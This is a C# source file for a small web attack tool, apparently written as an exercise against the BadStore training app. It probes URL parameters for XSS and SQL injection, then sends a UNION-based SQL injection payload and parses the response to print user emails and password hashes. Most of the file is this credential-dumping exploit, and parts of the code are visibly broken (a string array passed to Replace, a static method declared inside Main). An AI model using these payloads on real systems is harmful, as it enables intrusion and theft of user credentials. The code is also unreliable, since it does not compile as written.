using System;
using System.IO;
using System.Net;
using System.Linq;
using System.Text.RegularExpressions;

namespace asemoncms3
{
    class MainClass
    {
        public static void Main(string[] args)
        {
            //  var url = args[0];

            Console.WriteLine("Supply the URL to test.../n URL should be in <url>.com?param=&param2...format");
            string submUrl = Console.ReadLine();
            string url = IsHTTP(submUrl);
            Console.WriteLine($"Testing if {url} is vulnerable to SQL Injection ");



        Start:
            string[] parameters = url.Remove(0, url.IndexOf("?") + 1).Split('&');
            Console.Write("Paremeters to be tested are: ");
            foreach (string p in parameters)
            {
                Console.Write($"{p}, ");
            }

            string[] xxsiResult = XSSI(parameters);

            if (xxsiResult.Contains("No parameters were found"))
            {
                Console.WriteLine("Application does not seem to be vulnerable to XSS injection in parametrs given.\n" +
                    "Would you like to try a different url?(Y for yes N for No)");
                string tryNewUrl = Console.ReadLine();
                tryNewUrl.ToUpper();
                if (tryNewUrl.Contains('Y'))
                {
                    Console.WriteLine("input new url...");
                    url = Console.ReadLine();
                    goto Start;
                }
                else
                {
                    Console.WriteLine("Continuing to test parameters for SQLI");
                }
            }
                string[] xssiVulnParameters = xxsiResult;


            string[] sqliResult = SQLI(parameters);

            if (sqliResult.Contains("No parameters were found"))
            {
                Console.WriteLine("Application does not seem to be vulnerable to XSS injection in parametrs given.\n" +
                    "Would you like to try a different url?(Y for yes N for No)");
                string tryNewUrl = Console.ReadLine();
                tryNewUrl.ToUpper();
                if (tryNewUrl.Contains('Y'))
                {
                    Console.WriteLine("input new url...");
                    url = Console.ReadLine();
                    goto Start;
                }
                else
                {
                    Console.WriteLine("Goodbye...");
                    System.Environment.Exit(0);
                }
            }
                string[] sqliVunParameters = sqliResult;


            string fMarker = "BaSaExE";
            string mMarker = "eXeSsAb";
            string eMarker = "EXeBAsS";
            string fHex = string.Join("", fMarker.ToCharArray().Select(c => ((int)c).ToString("X2")));
            string mHex = string.Join("", mMarker.ToCharArray().Select(c => ((int)c).ToString("X2")));
            string eHex = string.Join("", eMarker.ToCharArray().Select(c => ((int)c).ToString("X2")));

            Console.WriteLine($"{fMarker}, {mMarker}, {eMarker}\n{fHex}, {mHex}, {eHex}");

            // string badStoreAddy = "172.16.1.129";
            //string URL = "http://"+badStoreAddy+"/cgi-bin/badstore.cgi";
            //+UNION+ALL+SELECT+NULL,+NULL,+CONCAT(0x7176627171,+email,+0x776872786573,passwd,0x71766b7671),+NULL+FROM+badstoredb.userdb%23&action=search&x=0&y=0
            string unionPayload = "Snake Oil' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x" + fHex + ",IFNULL(CAST(email AS CHAR),0x20),0x" + mHex + ",IFNULL(CAST(passwd as CHAR),0x20),0x" + eHex + ") FROM badstoredb.userdb-- ";
            //URL += "?searchquery=" + Uri.EscapeUriString(unionPayload) + "&action=search";
            string[] UP =  new [] { unionPayload };

            string sqliURL = url.Replace(parameters, parameters + Uri.EscapeUriString(unionPayload));
            Console.WriteLine($"{sqliURL}");
            HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(sqliURL);

            string httpWebResponse = string.Empty;
            using (StreamReader reader = new StreamReader(httpWebRequest.GetResponse().GetResponseStream()))
                httpWebResponse = reader.ReadToEnd();

            Regex payloadRegex = new Regex(fMarker + "(.*?)" + mMarker + "(.*?)" + eMarker);
            MatchCollection matches = payloadRegex.Matches(httpWebResponse);

            foreach (Match match in matches)
                Console.WriteLine($"Username: {match.Groups[1].Value}\t Password hash: {match.Groups[2].Value}");

            string[] XSSI(string[] xssParams)
            {
                string noVulnParms = "No parameters were found to be vulnerable to XSS attempts";
                foreach (string x in xssParams)
                {
                    bool isVuln = false;

                    int i = xssParams.Length;

                    string[] vulnParms = new string[i];


                    string xssi = url.Replace(x, x + "BASS<xss>EXE");
                    Console.WriteLine($"Testing {xssi} for XSS Vulnerability");

                    HttpWebRequest xssWebRequest = (HttpWebRequest)WebRequest.Create(xssi);
                    xssWebRequest.Method = "GET";

                    string xssiWebResponse = string.Empty;
                    using (StreamReader rdr = new
                        StreamReader(xssWebRequest.GetResponse().GetResponseStream()))
                    {
                        xssiWebResponse = rdr.ReadToEnd();
                    }


                    if (xssiWebResponse.Contains("xss"))
                    {
                        Console.WriteLine($"**\n Found Possible XSS point in parameter: {x} \n**");
                        isVuln = true;
                        vulnParms = xssParams;
                    }
                    else if (!xssiWebResponse.Contains("xss"))
                    {
                        Console.WriteLine(noVulnParms);
                        return new [] { noVulnParms };
                    }
                        return vulnParms;


                }

            }

                string[] SQLI(string[] sqliParams)
            {
                foreach (string s in sqliParams)
                {
                    bool isVuln = false;
                    string noVulnParams = "No parameters were found to be vulnerable to SQLI attempts";

                    int i = sqliParams.Length;
                    string[] vulnParms = new string[i];

                    string sqli = url.Replace(s, s + "'SELECT *");
                    Console.WriteLine($"Testing {sqliParams} for SQLI Vulnerability");

                    HttpWebRequest sqliWebRequest = (HttpWebRequest)WebRequest.Create(sqli);
                    sqliWebRequest.Method = "GET";

                    string sqliResp = string.Empty;
                    using (StreamReader rdr = new
                        StreamReader(sqliWebRequest.GetResponse().GetResponseStream()))
                    {
                        sqliResp = rdr.ReadToEnd();
                    }
                        if (sqliResp.Contains("SQL syntax"))
                        {
                            Console.WriteLine("**\nFOUND POSSIBLE SQL INJECTION in " + s + "\n**");
                            isVuln = true;
                            vulnParms = sqliParams;
                        }
                        else if (!sqliResp.Contains("SQL syntax"))
                        {
                            Console.WriteLine(noVulnParams);
                            return new[] { noVulnParams };
                        }

                        return vulnParms;
                    }
            }
            private static string IsHTTP(string url2Test)
            {
                string httpURL;
                if (!url2Test.Contains("http://"))
                {
                    httpURL = "http://" + url2Test;
                    url2Test = httpURL;
                }
                return url2Test;
            }
        }
    }
}